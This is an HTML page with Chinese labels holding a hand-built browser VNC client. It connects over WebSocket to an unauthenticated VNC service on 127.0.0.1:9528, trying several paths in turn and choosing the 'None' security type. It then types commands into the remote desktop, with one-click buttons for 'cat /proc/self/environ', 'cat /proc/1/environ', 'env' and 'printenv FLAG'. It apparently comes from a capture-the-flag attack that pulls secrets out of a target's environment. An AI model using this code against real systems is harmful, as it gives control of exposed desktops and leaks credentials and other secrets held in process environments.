<!doctype html>
<html lang="zh">
<head>
<meta charset="utf-8">
<title>vnc2</title>
<style>
  body{font-family:monospace;background:#0b0b0b;color:#ddd;padding:12px;font-size:13px;margin:0}
  h2{color:#6cf;margin:10px 0 4px}
  #log{white-space:pre-wrap;word-break:break-all;background:#151515;padding:6px;border-left:3px solid #444;max-height:200px;overflow:auto;font-size:12px}
  .ok{color:#3f6}.err{color:#c66}.info{color:#fc6}.warn{color:#f96}.big{color:#6cf;font-size:15px}
  #cv{border:2px solid #555;background:#000;display:block;max-width:100%;height:auto;image-rendering:pixelated}
  .bar{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin:6px 0}
  input[type=text]{flex:1;min-width:240px;background:#222;color:#eee;border:1px solid #444;padding:6px;font-family:monospace}
  button{background:#333;color:#eee;border:1px solid #555;padding:6px 10px;cursor:pointer;font-family:monospace}
  button:hover{background:#444}
  .cmd{background:#1a3a1a}
</style>
</head>
<body>
<h2>VNC over WS — 自适应 path/subprotocol 探测版</h2>
<div id="log"></div>
<h2>Desktop <span id="st" style="color:#fc6;font-size:12px"></span></h2>
<canvas id="cv" width="1280" height="1024"></canvas>
<div class="bar">
  <input type="text" id="txt" value="cat /proc/self/environ" spellcheck="false">
  <button onclick="doSend()">发送+回车</button>
  <button class="cmd" onclick="quick('cat /proc/self/environ')">cat /proc/self/environ</button>
  <button class="cmd" onclick="quick('cat /proc/1/environ')">cat /proc/1/environ</button>
  <button class="cmd" onclick="quick('env')">env</button>
  <button class="cmd" onclick="quick('printenv FLAG')">printenv FLAG</button>
  <button class="cmd" onclick="quick('xterm &')">开 xterm</button>
  <button class="cmd" onclick="quick('gnome-terminal &')">开 gnome-terminal</button>
</div>
<div class="bar">
  <button onclick="sendKey(0xFF0D,1);sendKey(0xFF0D,0)">Enter</button>
  <button onclick="sendKey(0xFF08,1);sendKey(0xFF08,0)">⌫</button>
  <button onclick="sendKey(0xFF1B,1);sendKey(0xFF1B,0)">Esc</button>
  <button onclick="ctrlC()">Ctrl+C</button>
  <button onclick="sendKey(0xFF52,1);sendKey(0xFF52,0)">↑</button>
  <button onclick="sendKey(0xFF54,1);sendKey(0xFF54,0)">↓</button>
  <button onclick="altF2()">Alt+F2(运行)</button>
  <button onclick="sendKey(0xFFE1,1);sendKey(0xFF54,1);sendKey(0xFF54,0);sendKey(0xFFE1,0)">Ctrl+T</button>
  <button onclick="document.getElementById('log').textContent=''">清日志</button>
</div>

<script>
const $=s=>document.querySelector(s);
const logEl=$('#log'), stEl=$('#st');
function log(c,m){const d=document.createElement('div');d.className=c;d.textContent=m;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
function st(m){stEl.textContent=m;}
const cv=$('#cv'), ctx=cv.getContext('2d');
let ws, buf=new Uint8Array(0), step=0, fbW=1280, fbH=1024, handshakeDone=false, firstPkt=true;

function push(d){const n=new Uint8Array(buf.length+d.length);n.set(buf);n.set(d,buf.length);buf=n;}
const u16=(a,i)=>(a[i]<<8)|a[i+1];
const u32=(a,i)=>(a[i]<<24)|(a[i+1]<<16)|(a[i+2]<<8)|a[i+3];
function send(b){if(ws&&ws.readyState===1) ws.send(b);}
function strBytes(s){const a=new Uint8Array(s.length);for(let i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return a;}
function toText(a){let s='';for(let i=0;i<a.length&&i<64;i++)s+=(a[i]>=32&&a[i]<127)?String.fromCharCode(a[i]):'\\x'+a[i].toString(16).padStart(2,'0');return s;}

function sendPixelFormat(){const b=new Uint8Array(20);b[0]=0;b[4]=32;b[5]=24;b[6]=0;b[7]=1;b[9]=255;b[11]=255;b[13]=255;b[14]=16;b[15]=8;b[16]=0;send(b);}
function sendEncodings(){const b=new Uint8Array(8);b[0]=2;b[3]=1;b[7]=0;send(b);}
function requestFb(incr,x,y,w,h){const b=new Uint8Array(10);b[0]=3;b[1]=incr?1:0;b[2]=(x>>8)&0xff;b[3]=x&0xff;b[4]=(y>>8)&0xff;b[5]=y&0xff;b[6]=(w>>8)&0xff;b[7]=w&0xff;b[8]=(h>>8)&0xff;b[9]=h&0xff;send(b);}
function sendKey(ks,down){const b=new Uint8Array(8);b[0]=4;b[1]=down?1:0;b[4]=(ks>>>24)&0xff;b[5]=(ks>>>16)&0xff;b[6]=(ks>>>8)&0xff;b[7]=ks&0xff;send(b);}
function sendPtr(x,y,mask){const b=new Uint8Array(6);b[0]=5;b[1]=mask;b[2]=(x>>8)&0xff;b[3]=x&0xff;b[4]=(y>>8)&0xff;b[5]=y&0xff;send(b);}

function drawRaw(x,y,w,h,data,off){
  const img=ctx.createImageData(w,h);const n=w*h;
  for(let i=0;i<n;i++){const p=off+i*4;img.data[i*4]=data[p+2];img.data[i*4+1]=data[p+1];img.data[i*4+2]=data[p];img.data[i*4+3]=255;}
  ctx.putImageData(img,x,y);
}

function pump(){
  let prog=true;
  while(prog){
    prog=false;
    if(step===0){
      if(buf.length<13) break;
      if(firstPkt){log('info','首包(前64B): "'+toText(buf.slice(0,13))+'"');firstPkt=false;}
      buf=buf.slice(13);
      send(strBytes('RFB 003.008\n'));
      step=1; prog=true;
    } else if(step===1){
      if(buf.length<1) break;
      const n=buf[0];
      if(n===0){
        if(buf.length<5) break;
        const rl=u32(buf,1);
        if(buf.length<5+rl) break;
        log('err','VNC reject: '+toText(buf.slice(5,5+rl)));
        return;
      }
      if(buf.length<1+n) break;
      const types=[...buf.slice(1,1+n)];
      log('info','security types: '+types.join(',')+'  (1=None,2=VNCAuth,16=Ultra)');
      buf=buf.slice(1+n);
      let sel=-1;
      if(types.includes(1)) sel=1; else if(types.includes(16)) sel=16; else if(types.includes(2)) sel=2; else sel=types[0];
      send(new Uint8Array([sel]));
      log(sel===1?'ok':'warn','selected: '+sel+(sel===1?' (None 无密码 ✓)':' (需要认证)'));
      step=(sel===1)?2:9;
      if(sel===2) log('err','需要 VNC 密码，此路不通');
      prog=true;
    } else if(step===2){
      if(buf.length<4) break;
      const r=u32(buf,0); buf=buf.slice(4);
      if(r!==0){log('err','AUTH FAILED');return;}
      send(new Uint8Array([1]));
      step=3; prog=true;
    } else if(step===3){
      if(buf.length<24) break;
      fbW=u16(buf,0); fbH=u16(buf,2);
      const nl=u32(buf,20);
      if(buf.length<24+nl) break;
      log('big','ServerInit: '+fbW+'x'+fbH+' desktop="'+toText(buf.slice(24,24+nl))+'"');
      buf=buf.slice(24+nl);
      cv.width=fbW; cv.height=fbH;
      sendPixelFormat(); sendEncodings();
      requestFb(0,0,0,fbW,fbH,0);
      step=4; handshakeDone=true; st('已连接，加载桌面…'); prog=true;
    } else if(step===4){
      if(buf.length<1) break;
      const t=buf[0];
      if(t===0){
        if(buf.length<4) break;
        const rects=u16(buf,2);
        let off=4, ok=true; const list=[];
        for(let i=0;i<rects;i++){
          if(buf.length<off+12){ok=false;break;}
          const x=u16(buf,off),y=u16(buf,off+2),w=u16(buf,off+4),h=u16(buf,off+6),enc=u32(buf,off+8);
          let dl=0;
          if(enc===0) dl=w*h*4;
          else if(enc===1) dl=4;
          else {ok=false;break;}
          list.push({x,y,w,h,enc,doff:off+12,dl});
          off+=12+dl;
        }
        if(!ok) break;
        if(buf.length<off) break;
        for(const r of list) if(r.enc===0) drawRaw(r.x,r.y,r.w,r.h,buf,r.doff);
        buf=buf.slice(off);
        requestFb(1,0,0,fbW,fbH,1);
        prog=true; st('桌面 '+fbW+'x'+fbH+' 已更新');
      } else if(t===1){if(buf.length<5)break;const n=u16(buf,2);if(buf.length<5+n*6)break;buf=buf.slice(5+n*6);prog=true;}
      else if(t===2){buf=buf.slice(1);prog=true;}
      else if(t===3){if(buf.length<8)break;const len=u32(buf,4);if(buf.length<8+len)break;buf=buf.slice(8+len);prog=true;}
      else {buf=buf.slice(1);prog=true;}
    } else if(step===9){break;}
  }
}

// —— 自适应连接：尝试多 path + subprotocol ——
const candidates=[
  {path:'/websockify', sub:undefined},
  {path:'/', sub:undefined},
  {path:'/websockify/', sub:undefined},
  {path:'/websockify', sub:['binary']},
  {path:'/', sub:['binary']},
];
let candIdx=0;

function tryNext(){
  if(candIdx>=candidates.length){
    log('err','所有 path/subprotocol 组合都失败。可能 VNC 被占用（单连接）或需鉴权。');
    st('连接失败');
    return;
  }
  const c=candidates[candIdx++];
  log('info','尝试 ['+candIdx+'/'+candidates.length+'] ws://127.0.0.1:9528'+c.path+(c.sub?(' sub='+c.sub):''));
  buf=new Uint8Array(0); step=0; firstPkt=true; handshakeDone=false;
  try{ ws=new WebSocket('ws://127.0.0.1:9528'+c.path, c.sub);}catch(e){log('err','ctor: '+e);return tryNext();}
  ws.binaryType='arraybuffer';
  let gotMsg=false;
  ws.onopen=()=>log('ok','WS open');
  ws.onmessage=(e)=>{
    gotMsg=true;
    push(new Uint8Array(e.data));
    pump();
  };
  ws.onerror=()=>log('err','WS error (path='+c.path+')');
  ws.onclose=(e)=>{
    log('err','WS close code='+e.code+' reason='+e.reason+(gotMsg?' [收到过数据]':' [未收到任何数据]'));
    // 若还没完成握手，自动尝试下一个候选
    if(!handshakeDone){
      setTimeout(tryNext, 400);
    }
  };
}
tryNext();

async function sendText(s){for(const ch of s){const ks=ch.charCodeAt(0);sendKey(ks,1);sendKey(ks,0);await new Promise(r=>setTimeout(r,12));}}
function doSend(){const t=$('#txt').value;sendText(t).then(()=>{sendKey(0xFF0D,1);sendKey(0xFF0D,0);});}
function quick(s){$('#txt').value=s;sendText(s).then(()=>{sendKey(0xFF0D,1);sendKey(0xFF0D,0);});}
function ctrlC(){sendKey(0xFFE3,1);sendKey(0x63,1);sendKey(0x63,0);sendKey(0xFFE3,0);}
function altF2(){sendKey(0xFFE9,1);sendKey(0xFFBF,1);sendKey(0xFFBF,0);sendKey(0xFFE9,0);}
cv.onclick=(e)=>{const r=cv.getBoundingClientRect();const x=Math.round((e.clientX-r.left)/r.width*fbW);const y=Math.round((e.clientY-r.top)/r.height*fbH);sendPtr(x,y,0);sendPtr(x,y,1);sendPtr(x,y,0);};
$('#txt').addEventListener('keydown',(e)=>{if(e.key==='Enter')doSend();});
</script>
</body>
</html>
